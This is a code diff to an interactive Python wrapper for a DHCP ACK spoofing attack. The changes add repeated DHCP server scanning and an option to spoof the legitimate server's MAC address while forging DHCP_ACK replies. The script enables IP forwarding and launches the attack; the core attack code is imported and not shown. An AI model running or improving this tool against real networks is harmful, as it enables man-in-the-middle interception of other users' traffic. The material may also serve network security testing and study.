@@ -6,8 +6,14 @@ from dhcp_ack_spoofing import *
 import os
 from subprocess import PIPE, Popen
 
+def do_dhcp_scan():
+    timeout = input('Timeout value in sec (5 is good) :')
+    print('Scanning...')
+    attack.scan_dhcp_servers(timeout=timeout)
+    attack.print_found_dhcp()
 
-print('DHCP_ack_spoofing module.')
+
+print('\n\o/ **DHCP_ack_spoofing module!** \o/\n')
 
 if os.getuid() != 0:
     print('This tools need to be runned as root!')
@@ -22,8 +28,6 @@ if int(out.split(' ')[2]) != 1:
         p1 = Popen(['sysctl', 'net.ipv4.ip_forward=1'], stdout=PIPE, stderr=PIPE)
         p1.communicate()
 
-
-print('\n\n')
 
 interface = raw_input('Network interface to listen/spoof :').strip()
 
@@ -44,14 +48,14 @@ attack = DHCPAckSpoofing(interface=interface)
 
 print('\n\n')
 
+print('We can scan for existing DHCP and then spoof their MAC address while forging the DHCP_ACK')
 do_scan = raw_input('Do you want to scan for DHCP servers \n'
                 'before listening for incoming requests? (y/n) :')
 
-if do_scan == 'y':
-    timeout = input('Timeout value in sec (5 is good) :')
-    print('Scanning...')
-    attack.scan_dhcp_servers(timeout=timeout)
-    attack.print_found_dhcp()
+while do_scan == 'y':
+    do_dhcp_scan()
+    do_scan = raw_input('Rescan again? (y/n) :')
+
 
 print('\n\n')
 
@@ -69,4 +73,4 @@ print('\n\n')
 print('\nLaunching the attack!!')
 print('Waiting for clients to send DHCP request...')
 
-attack.launch_attack(domain_config=domain)
+attack.launch_attack(domain_config=domain, try_spoof_dhcp_mac=True)
